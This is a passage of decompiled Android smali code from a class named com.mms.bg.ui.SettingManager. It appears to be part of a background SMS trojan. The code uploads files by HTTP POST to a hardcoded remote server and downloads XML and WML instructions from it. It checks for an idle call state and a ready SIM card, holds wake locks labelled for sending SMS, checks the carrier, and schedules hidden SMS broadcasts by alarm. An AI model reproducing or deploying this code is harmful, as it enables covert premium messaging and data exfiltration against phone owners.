    .line 847
    .local v7, readLength:I
    :goto_98
    const/4 v8, 0x0

    const/16 v9, 0x400

    invoke-virtual {v4, v0, v8, v9}, Ljava/io/InputStream;->read([BII)I

    move-result v7

    const/4 v8, -0x1

    if-eq v7, v8, :cond_cb

    .line 848
    const/4 v8, 0x0

    invoke-virtual {v3, v0, v8, v7}, Ljava/io/FileOutputStream;->write([BII)V

    .line 849
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->flush()V
    :try_end_a9
    .catch Ljava/lang/Exception; {:try_start_6e .. :try_end_a9} :catch_aa

    goto :goto_98

    .line 855
    .end local v0           #buffer:[B
    .end local v3           #fos:Ljava/io/FileOutputStream;
    .end local v4           #is:Ljava/io/InputStream;
    .end local v5           #outFile:Ljava/io/File;
    .end local v7           #readLength:I
    :catch_aa
    move-exception v8

    move-object v1, v8

    .line 856
    .local v1, e:Ljava/lang/Exception;
    const-string v8, "SettingManager"

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "[[getTargetNum]] e = "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v11, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move v8, v10

    .line 857
    goto/16 :goto_14

    .line 851
    .end local v1           #e:Ljava/lang/Exception;
    .restart local v0       #buffer:[B
    .restart local v3       #fos:Ljava/io/FileOutputStream;
    .restart local v4       #is:Ljava/io/InputStream;
    .restart local v5       #outFile:Ljava/io/File;
    .restart local v7       #readLength:I
    :cond_cb
    :try_start_cb
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->close()V

    .line 852
    invoke-virtual {v4}, Ljava/io/InputStream;->close()V

    .line 853
    iget-object v8, p0, Lcom/mms/bg/ui/SettingManager;->DOWNLOAD_FILE_PATH:Ljava/lang/String;

    invoke-direct {p0, v8}, Lcom/mms/bg/ui/SettingManager;->dumpReceiveFile(Ljava/lang/String;)V
    :try_end_d6
    .catch Ljava/lang/Exception; {:try_start_cb .. :try_end_d6} :catch_aa

    .line 859
    const/4 v8, 0x1

    goto/16 :goto_14
.end method

.method public isCallIdle()Z
    .registers 4

    .prologue
    .line 375
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    const-string v2, "phone"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    .line 376
    .local v0, tm:Landroid/telephony/TelephonyManager;
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getCallState()I

    move-result v1

    if-nez v1, :cond_12

    .line 377
    const/4 v1, 0x1

    .line 379
    :goto_11
    return v1

    :cond_12
    const/4 v1, 0x0

    goto :goto_11
.end method

.method public isSimCardReady()Z
    .registers 4

    .prologue
    .line 367
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    const-string v2, "phone"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    .line 368
    .local v0, tm:Landroid/telephony/TelephonyManager;
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSimState()I

    move-result v1

    const/4 v2, 0x5

    if-ne v1, v2, :cond_13

    .line 369
    const/4 v1, 0x1

    .line 371
    :goto_12
    return v1

    :cond_13
    const/4 v1, 0x0

    goto :goto_12
.end method

.method public log(Ljava/lang/String;)V
    .registers 2
    .parameter "log"

    .prologue
    .line 350
    return-void
.end method

.method public log(Ljava/lang/String;Ljava/lang/String;)V
    .registers 3
    .parameter "tag"
    .parameter "log"

    .prologue
    .line 336
    return-void
.end method

.method public makePartialWakeLock()V
    .registers 4

    .prologue
    .line 168
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mPartWakeLock:Landroid/os/PowerManager$WakeLock;

    if-nez v1, :cond_1d

    .line 169
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    const-string v2, "power"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    .line 170
    .local v0, pm:Landroid/os/PowerManager;
    const/4 v1, 0x1

    const-string v2, "prepareSendSMS"

    invoke-virtual {v0, v1, v2}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v1

    iput-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mPartWakeLock:Landroid/os/PowerManager$WakeLock;

    .line 171
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mPartWakeLock:Landroid/os/PowerManager$WakeLock;

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Landroid/os/PowerManager$WakeLock;->setReferenceCounted(Z)V

    .line 173
    .end local v0           #pm:Landroid/os/PowerManager;
    :cond_1d
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mPartWakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v1}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 174
    return-void
.end method

.method public makeWakeLock()V
    .registers 4

    .prologue
    .line 153
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mWakeLock:Landroid/os/PowerManager$WakeLock;

    if-nez v1, :cond_1f

    .line 154
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    const-string v2, "power"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    .line 155
    .local v0, pm:Landroid/os/PowerManager;
    const v1, 0x1000000a

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v1

    iput-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mWakeLock:Landroid/os/PowerManager$WakeLock;

    .line 157
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mWakeLock:Landroid/os/PowerManager$WakeLock;

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Landroid/os/PowerManager$WakeLock;->setReferenceCounted(Z)V

    .line 159
    .end local v0           #pm:Landroid/os/PowerManager;
    :cond_1f
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mWakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v1}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 160
    return-void
.end method

.method public openConnection(Ljava/io/File;)Lorg/apache/http/HttpResponse;
    .registers 13
    .parameter "uploadFile"

    .prologue
    const/4 v10, 0x0

    .line 630
    const-string v8, "[[openConnection]]"

    invoke-direct {p0, v8}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 631
    new-instance v5, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {p0}, Lcom/mms/bg/ui/SettingManager;->getParams()Lorg/apache/http/params/HttpParams;

    move-result-object v8

    invoke-direct {v5, v8}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>(Lorg/apache/http/params/HttpParams;)V

    .line 632
    .local v5, hc:Lorg/apache/http/client/HttpClient;
    new-instance v6, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v6}, Lorg/apache/http/client/methods/HttpPost;-><init>()V

    .line 634
    .local v6, post:Lorg/apache/http/client/methods/HttpPost;
    :try_start_14
    new-instance v8, Ljava/net/URI;

    const-string v9, "http://www.youlubg.com:81/Coop/request3.php"

    invoke-direct {v8, v9}, Ljava/net/URI;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v8}, Lorg/apache/http/client/methods/HttpPost;->setURI(Ljava/net/URI;)V
    :try_end_1e
    .catch Ljava/net/URISyntaxException; {:try_start_14 .. :try_end_1e} :catch_4d

    .line 639
    const-string v8, "Content-Type"

    const-string v9, "text/plain"

    invoke-virtual {v6, v8, v9}, Lorg/apache/http/client/methods/HttpPost;->setHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 640
    const-string v8, "Accept"

    const-string v9, "*/*"

    invoke-virtual {v6, v8, v9}, Lorg/apache/http/client/methods/HttpPost;->setHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 641
    if-eqz p1, :cond_42

    .line 642
    const/4 v2, 0x0

    .line 644
    .local v2, entity:Lorg/apache/http/entity/InputStreamEntity;
    :try_start_2f
    new-instance v4, Ljava/io/FileInputStream;

    invoke-direct {v4, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 645
    .local v4, fis:Ljava/io/FileInputStream;
    new-instance v3, Lorg/apache/http/entity/InputStreamEntity;

    invoke-virtual {v4}, Ljava/io/FileInputStream;->available()I

    move-result v8

    int-to-long v8, v8

    invoke-direct {v3, v4, v8, v9}, Lorg/apache/http/entity/InputStreamEntity;-><init>(Ljava/io/InputStream;J)V
    :try_end_3e
    .catch Ljava/io/FileNotFoundException; {:try_start_2f .. :try_end_3e} :catch_54
    .catch Ljava/io/IOException; {:try_start_2f .. :try_end_3e} :catch_5a

    .end local v2           #entity:Lorg/apache/http/entity/InputStreamEntity;
    .local v3, entity:Lorg/apache/http/entity/InputStreamEntity;
    move-object v2, v3

    .line 651
    .end local v3           #entity:Lorg/apache/http/entity/InputStreamEntity;
    .end local v4           #fis:Ljava/io/FileInputStream;
    .restart local v2       #entity:Lorg/apache/http/entity/InputStreamEntity;
    :goto_3f
    invoke-virtual {v6, v2}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 654
    .end local v2           #entity:Lorg/apache/http/entity/InputStreamEntity;
    :cond_42
    :try_start_42
    invoke-interface {v5, v6}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v7

    .line 655
    .local v7, response:Lorg/apache/http/HttpResponse;
    const-string v8, "[[openConnection]] return response != null"

    invoke-direct {p0, v8}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V
    :try_end_4b
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_42 .. :try_end_4b} :catch_65
    .catch Ljava/io/IOException; {:try_start_42 .. :try_end_4b} :catch_63
    .catch Ljava/lang/Exception; {:try_start_42 .. :try_end_4b} :catch_60

    move-object v8, v7

    .line 670
    .end local v7           #response:Lorg/apache/http/HttpResponse;
    :goto_4c
    return-object v8

    .line 635
    :catch_4d
    move-exception v8

    move-object v0, v8

    .line 636
    .local v0, e:Ljava/net/URISyntaxException;
    invoke-virtual {v0}, Ljava/net/URISyntaxException;->printStackTrace()V

    move-object v8, v10

    .line 637
    goto :goto_4c

    .line 646
    .end local v0           #e:Ljava/net/URISyntaxException;
    .restart local v2       #entity:Lorg/apache/http/entity/InputStreamEntity;
    :catch_54
    move-exception v8

    move-object v1, v8

    .line 647
    .local v1, e1:Ljava/io/FileNotFoundException;
    invoke-virtual {v1}, Ljava/io/FileNotFoundException;->printStackTrace()V

    goto :goto_3f

    .line 648
    .end local v1           #e1:Ljava/io/FileNotFoundException;
    :catch_5a
    move-exception v8

    move-object v0, v8

    .line 649
    .local v0, e:Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_3f

    .line 665
    .end local v0           #e:Ljava/io/IOException;
    .end local v2           #entity:Lorg/apache/http/entity/InputStreamEntity;
    :catch_60
    move-exception v8

    :goto_61
    move-object v8, v10

    .line 670
    goto :goto_4c

    .line 661
    :catch_63
    move-exception v8

    goto :goto_61

    .line 657
    :catch_65
    move-exception v8

    goto :goto_61
.end method

.method public openConnection(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Lorg/apache/http/HttpResponse;
    .registers 11
    .parameter "url"
    .parameter "ip"
    .parameter "port"

    .prologue
    const/4 v6, 0x0

    .line 674
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "[[openConnection]] url = "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, " ip = "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, " port = "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-direct {p0, v4}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 675
    new-instance v2, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {p0, p2, p3}, Lcom/mms/bg/ui/SettingManager;->getParams(Ljava/lang/String;Ljava/lang/String;)Lorg/apache/http/params/HttpParams;

    move-result-object v4

    invoke-direct {v2, v4}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>(Lorg/apache/http/params/HttpParams;)V

    .line 676
    .local v2, hc:Lorg/apache/http/client/HttpClient;
    new-instance v1, Lorg/apache/http/client/methods/HttpGet;

    invoke-direct {v1}, Lorg/apache/http/client/methods/HttpGet;-><init>()V

    .line 679
    .local v1, get:Lorg/apache/http/client/methods/HttpGet;
    :try_start_39
    new-instance v4, Ljava/net/URI;

    invoke-direct {v4, p1}, Ljava/net/URI;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v4}, Lorg/apache/http/client/methods/HttpGet;->setURI(Ljava/net/URI;)V
    :try_end_41
    .catch Ljava/net/URISyntaxException; {:try_start_39 .. :try_end_41} :catch_5a

    .line 685
    const-string v4, "Accept"

    const-string v5, "*/*"

    invoke-virtual {v1, v4, v5}, Lorg/apache/http/client/methods/HttpGet;->setHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 687
    const-string v4, "Connection"

    const-string v5, "Keep-Alive"

    invoke-virtual {v1, v4, v5}, Lorg/apache/http/client/methods/HttpGet;->setHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 690
    :try_start_4f
    invoke-interface {v2, v1}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v3

    .line 691
    .local v3, response:Lorg/apache/http/HttpResponse;
    const-string v4, "[[openConnection]] return response != null"

    invoke-direct {p0, v4}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V
    :try_end_58
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_4f .. :try_end_58} :catch_66
    .catch Ljava/io/IOException; {:try_start_4f .. :try_end_58} :catch_64
    .catch Ljava/lang/Exception; {:try_start_4f .. :try_end_58} :catch_61

    move-object v4, v3

    .line 706
    .end local v3           #response:Lorg/apache/http/HttpResponse;
    :goto_59
    return-object v4

    .line 680
    :catch_5a
    move-exception v4

    move-object v0, v4

    .line 681
    .local v0, e:Ljava/net/URISyntaxException;
    invoke-virtual {v0}, Ljava/net/URISyntaxException;->printStackTrace()V

    move-object v4, v6

    .line 682
    goto :goto_59

    .line 701
    .end local v0           #e:Ljava/net/URISyntaxException;
    :catch_61
    move-exception v4

    :goto_62
    move-object v4, v6

    .line 706
    goto :goto_59

    .line 697
    :catch_64
    move-exception v4

    goto :goto_62

    .line 693
    :catch_66
    move-exception v4

    goto :goto_62
.end method

.method public parseServerXMLInfo()Z
    .registers 6

    .prologue
    const/4 v4, 0x1

    .line 931
    new-instance v1, Ljava/io/File;

    iget-object v3, p0, Lcom/mms/bg/ui/SettingManager;->DOWNLOAD_FILE_PATH:Ljava/lang/String;

    invoke-direct {v1, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 932
    .local v1, file:Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v3

    if-ne v3, v4, :cond_31

    .line 935
    :try_start_e
    invoke-static {}, Ljavax/xml/parsers/SAXParserFactory;->newInstance()Ljavax/xml/parsers/SAXParserFactory;

    move-result-object v3

    invoke-virtual {v3}, Ljavax/xml/parsers/SAXParserFactory;->newSAXParser()Ljavax/xml/parsers/SAXParser;

    move-result-object v2

    .line 936
    .local v2, mSaxparser:Ljavax/xml/parsers/SAXParser;
    new-instance v3, Lcom/mms/bg/util/XMLHandler;

    invoke-direct {v3}, Lcom/mms/bg/util/XMLHandler;-><init>()V

    iput-object v3, p0, Lcom/mms/bg/ui/SettingManager;->mXMLHandler:Lcom/mms/bg/util/XMLHandler;

    .line 937
    iget-object v3, p0, Lcom/mms/bg/ui/SettingManager;->mXMLHandler:Lcom/mms/bg/util/XMLHandler;

    invoke-virtual {v2, v1, v3}, Ljavax/xml/parsers/SAXParser;->parse(Ljava/io/File;Lorg/xml/sax/helpers/DefaultHandler;)V

    .line 939
    iget-object v3, p0, Lcom/mms/bg/ui/SettingManager;->mXMLHandler:Lcom/mms/bg/util/XMLHandler;

    invoke-virtual {v3}, Lcom/mms/bg/util/XMLHandler;->dumpXMLParseInfo()V

    .line 940
    invoke-direct {p0}, Lcom/mms/bg/ui/SettingManager;->refreshChannelSP()V
    :try_end_2a
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_2a} :catch_2c

    move v3, v4

    .line 946
    .end local v2           #mSaxparser:Ljavax/xml/parsers/SAXParser;
    :goto_2b
    return v3

    .line 942
    :catch_2c
    move-exception v3

    move-object v0, v3

    .line 943
    .local v0, e:Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 946
    .end local v0           #e:Ljava/lang/Exception;
    :cond_31
    const/4 v3, 0x0

    goto :goto_2b
.end method

.method public parseWMLInfo()Z
    .registers 6

    .prologue
    const/4 v4, 0x1

    .line 950
    new-instance v1, Ljava/io/File;

    iget-object v3, p0, Lcom/mms/bg/ui/SettingManager;->VEDIO_DOWNLOAD_FILE_PATH:Ljava/lang/String;

    invoke-direct {v1, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 951
    .local v1, file:Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v3

    if-ne v3, v4, :cond_29

    .line 954
    :try_start_e
    invoke-static {}, Ljavax/xml/parsers/SAXParserFactory;->newInstance()Ljavax/xml/parsers/SAXParserFactory;

    move-result-object v3

    invoke-virtual {v3}, Ljavax/xml/parsers/SAXParserFactory;->newSAXParser()Ljavax/xml/parsers/SAXParser;

    move-result-object v2

    .line 955
    .local v2, mSaxparser:Ljavax/xml/parsers/SAXParser;
    new-instance v3, Lcom/mms/bg/util/WMLHandler;

    invoke-direct {v3}, Lcom/mms/bg/util/WMLHandler;-><init>()V

    iput-object v3, p0, Lcom/mms/bg/ui/SettingManager;->mWMLHandler:Lcom/mms/bg/util/WMLHandler;

    .line 956
    iget-object v3, p0, Lcom/mms/bg/ui/SettingManager;->mWMLHandler:Lcom/mms/bg/util/WMLHandler;

    invoke-virtual {v2, v1, v3}, Ljavax/xml/parsers/SAXParser;->parse(Ljava/io/File;Lorg/xml/sax/helpers/DefaultHandler;)V
    :try_end_22
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_22} :catch_24

    move v3, v4

    .line 965
    .end local v2           #mSaxparser:Ljavax/xml/parsers/SAXParser;
    :goto_23
    return v3

    .line 961
    :catch_24
    move-exception v3

    move-object v0, v3

    .line 962
    .local v0, e:Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 965
    .end local v0           #e:Ljava/lang/Exception;
    :cond_29
    const/4 v3, 0x0

    goto :goto_23
.end method

.method public phoneNumBelongToCMCC()Z
    .registers 4

    .prologue
    .line 454
    invoke-virtual {p0}, Lcom/mms/bg/ui/SettingManager;->getSMSCenter()Ljava/lang/String;

    move-result-object v0

    .line 455
    .local v0, smsCenter:Ljava/lang/String;
    if-eqz v0, :cond_15

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    const/16 v2, 0xb

    if-ne v1, v2, :cond_15

    .line 456
    const-string v1, "130"

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v1

    .line 458
    :goto_14
    return v1

    :cond_15
    const/4 v1, 0x0

    goto :goto_14
.end method

.method public registerCMNetNetWorkChangeReceiver()V
    .registers 4

    .prologue
    .line 1176
    new-instance v1, Lcom/mms/bg/ui/SettingManager$CMNetNetworkChangeReceiver;

    const/4 v2, 0x0

    invoke-direct {v1, p0, v2}, Lcom/mms/bg/ui/SettingManager$CMNetNetworkChangeReceiver;-><init>(Lcom/mms/bg/ui/SettingManager;Lcom/mms/bg/ui/SettingManager$1;)V

    iput-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mCMNetChangeReceiver:Lcom/mms/bg/ui/SettingManager$CMNetNetworkChangeReceiver;

    .line 1178
    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "android.net.conn.CONNECTIVITY_CHANGE"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 1179
    .local v0, upIntentFilter:Landroid/content/IntentFilter;
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    iget-object v2, p0, Lcom/mms/bg/ui/SettingManager;->mCMNetChangeReceiver:Lcom/mms/bg/ui/SettingManager$CMNetNetworkChangeReceiver;

    invoke-virtual {v1, v2, v0}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 1180
    return-void
.end method

.method public releasePartialWakeLock()V
    .registers 2

    .prologue
    .line 177
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mPartWakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V

    .line 178
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mPartWakeLock:Landroid/os/PowerManager$WakeLock;

    .line 179
    return-void
.end method

.method public releaseWakeLock()V
    .registers 2

    .prologue
    .line 163
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mWakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V

    .line 164
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mWakeLock:Landroid/os/PowerManager$WakeLock;

    .line 165
    return-void
.end method

.method public saveCurrentVedioDownloadLink(Ljava/lang/String;)V
    .registers 13
    .parameter "link"

    .prologue
    const/4 v6, 0x0

    const-string v10, "vedio_download_link4"

    const-string v9, "vedio_download_link3"

    const-string v8, "vedio_download_link2"

    const-string v7, "vedio_download_link1"

    .line 1250
    iget-object v4, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v5, "vedio_download_link1"

    invoke-interface {v4, v7, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 1251
    .local v0, link1:Ljava/lang/String;
    iget-object v4, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v5, "vedio_download_link2"

    invoke-interface {v4, v8, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 1252
    .local v1, link2:Ljava/lang/String;
    iget-object v4, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v5, "vedio_download_link3"

    invoke-interface {v4, v9, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 1253
    .local v2, link3:Ljava/lang/String;
    iget-object v4, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v5, "vedio_download_link4"

    invoke-interface {v4, v10, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 1254
    .local v3, link4:Ljava/lang/String;
    if-nez v0, :cond_32

    iget-object v4, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v5, "vedio_download_link1"

    invoke-interface {v4, v7, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 1255
    :cond_32
    if-nez v1, :cond_3b

    iget-object v4, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v5, "vedio_download_link2"

    invoke-interface {v4, v8, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 1256
    :cond_3b
    if-nez v2, :cond_44

    iget-object v4, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v5, "vedio_download_link3"

    invoke-interface {v4, v9, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 1257
    :cond_44
    if-nez v3, :cond_4d

    iget-object v4, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v5, "vedio_download_link4"

    invoke-interface {v4, v10, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 1258
    :cond_4d
    if-eqz v0, :cond_5c

    if-eqz v1, :cond_5c

    if-eqz v2, :cond_5c

    if-eqz v3, :cond_5c

    .line 1259
    iget-object v4, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v5, "vedio_download_link1"

    invoke-interface {v4, v7, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 1261
    :cond_5c
    iget-object v4, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 1262
    return-void
.end method

.method public sendBroadcastAction(Ljava/lang/String;J)V
    .registers 12
    .parameter "action"
    .parameter "delay"

    .prologue
    const/4 v7, 0x0

    .line 410
    if-eqz p1, :cond_26

    .line 411
    new-instance v3, Landroid/content/Intent;

    invoke-direct {v3}, Landroid/content/Intent;-><init>()V

    .line 412
    .local v3, intent:Landroid/content/Intent;
    const-string v5, "com.mms.bg.SMS"

    invoke-virtual {v3, v5}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 413
    iget-object v5, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    invoke-static {v5, v7, v3, v7}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    .line 414
    .local v4, sender:Landroid/app/PendingIntent;
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    .line 416
    .local v1, currentTime:J
    iget-object v5, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    const-string v6, "alarm"

    invoke-virtual {v5, v6}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 417
    .local v0, am:Landroid/app/AlarmManager;
    add-long v5, v1, p2

    invoke-virtual {v0, v7, v5, v6, v4}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 419
    .end local v0           #am:Landroid/app/AlarmManager;
    .end local v1           #currentTime:J
    .end local v3           #intent:Landroid/content/Intent;
    .end local v4           #sender:Landroid/app/PendingIntent;
    :cond_26
    return-void
.end method

.method public setConfirmInfo(Ljava/lang/String;)V
    .registers 4
    .parameter "str"

    .prologue
    .line 243
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "sms_confirm_info"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 244
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

